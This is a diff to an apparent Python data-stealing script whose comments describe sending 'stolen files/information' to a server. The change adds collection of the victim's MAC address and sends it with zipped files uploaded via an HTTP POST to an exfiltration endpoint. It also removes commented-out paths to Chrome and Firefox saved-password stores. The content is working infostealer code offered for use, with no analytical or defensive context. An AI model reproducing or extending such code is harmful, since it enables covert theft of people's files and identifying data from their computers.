@@ -1,17 +1,18 @@
 import os # dealing with files
+import sys # to check operating system
 from zipfile import ZipFile
 import requests # to send files
 import threading # to run file sending mechanism in the background
 import mimetypes # to get MIME types for files
 from contextlib import ExitStack # to close files properly
-from secrets import token_hex
+from secrets import token_hex # to generate hashes to avoid file name conflicts
+from getmac import get_mac_address # to get mac address
 
 URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the stolen files/information to
 ZIP_URL = 'http://127.0.0.1:8000/zip'
 AMOUNT_TO_SEND = 500.0 # How many files you want to send each time
 USERNAME = os.getlogin()
-#GOOGLE_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Local\Google\Chrome\\User Data\Default' # location of Google passwords
-#FIREFOX_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords
+MAC = get_mac_address().replace(':', '') # store mac address
 
 #file_types = ['.txt'] # if checking for multiple file types
 files_found = [] # log files found.
@@ -35,7 +36,7 @@ def steal_zipped_files():
     zip_name = make_zip() # make the zip with all its files and save its name
     with open(zip_name, 'rb') as zip: # open the zip file in bytes so it can be sent properly
         zip_file = {'file':(zip_name, zip, 'application/zip')} # make the payload
-        r = requests.post(ZIP_URL, files=zip_file) # send the zip file
+        r = requests.post(ZIP_URL, headers={'mac':MAC}, files=zip_file) # send the zip file
         zip.close()
         if not 300 > r.status_code >= 200:
             pass
